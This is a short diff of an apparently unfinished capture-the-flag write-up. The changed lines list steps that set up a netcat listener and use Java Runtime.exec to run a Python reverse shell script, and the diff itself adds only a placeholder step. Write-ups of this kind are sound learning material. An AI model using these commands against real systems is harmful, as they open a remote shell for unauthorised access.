@@ -16,6 +16,7 @@ Still working on it... just dropping commands
 8. *Setup Netcat listener*
    ```nc -l 10.40.3.230```
 9. ```print new java.lang.Runtime().exec("python3 /tmp/reverse.py")```
+10. ```...```
 
 
 **NOTE:** I did not finish this challenge before the competition ended. However, one of my teammates was able to solve before the competition ended.
